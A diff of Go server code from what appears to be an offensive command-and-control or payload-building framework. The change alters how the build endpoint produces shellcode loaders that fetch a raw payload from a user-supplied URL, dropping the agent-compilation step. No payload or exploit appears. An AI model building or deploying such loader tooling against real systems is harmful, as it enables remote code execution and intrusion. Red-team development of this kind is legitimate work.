@@ -1284,37 +1284,14 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 		result["html"] = htmlPath
 
 	case cfg.RawPayload && (cfg.Format == "loader" || cfg.Format == "loader-c" || cfg.Format == "loader-nim" || cfg.Format == "loader-rust"):
-		// Raw mode: build shellcode (.bin) without staging/encryption; loader fetches
-		// directly from user-supplied URL. Go loader skips XOR when key=""; C/Nim/Rust
-		// use "00000000" (4 zero bytes) so XOR is a no-op on the raw shellcode.
+		// Raw mode: user provides a pre-built shellcode .bin at PayloadURL.
+		// Only the loader wrapper is built — no agent compilation or donut step.
 		if cfg.PayloadURL == "" {
 			jsonErr(w, "payload_url required for raw_payload=true", http.StatusBadRequest)
 			return
 		}
-		var exePath string
-		var err error
-		switch cfg.Lang {
-		case "c":
-			exePath, err = BuildCAgentEXE(cfg, payloadsDir)
-		case "nim":
-			exePath, err = BuildNimEXE(cfg, payloadsDir)
-		case "rust":
-			exePath, err = BuildRustEXE(cfg, payloadsDir)
-		case "csharp":
-			exePath, err = BuildCSharpEXE(cfg, payloadsDir)
-		default:
-			exePath, err = BuildEXE(cfg, payloadsDir)
-		}
-		if err != nil {
-			jsonErr(w, "build exe: "+err.Error(), http.StatusInternalServerError)
-			return
-		}
-		binPath, err := BuildRAW(exePath, payloadsDir)
-		if err != nil {
-			jsonErr(w, "build shellcode: "+err.Error(), http.StatusInternalServerError)
-			return
-		}
 		var loaderPath string
+		var err error
 		switch cfg.Format {
 		case "loader-c":
 			loaderPath, err = BuildCLoader(cfg, cfg.PayloadURL, "00000000", deliveryDir)
@@ -1332,7 +1309,6 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 		op := operatorFromCert(r)
 		s.printf("[%s] build raw loader (%s): url=%s\n", op, cfg.Format, cfg.PayloadURL)
 		result["loader"] = loaderPath
-		result["bin"] = binPath
 		jsonOK(w, result)
 		return
 
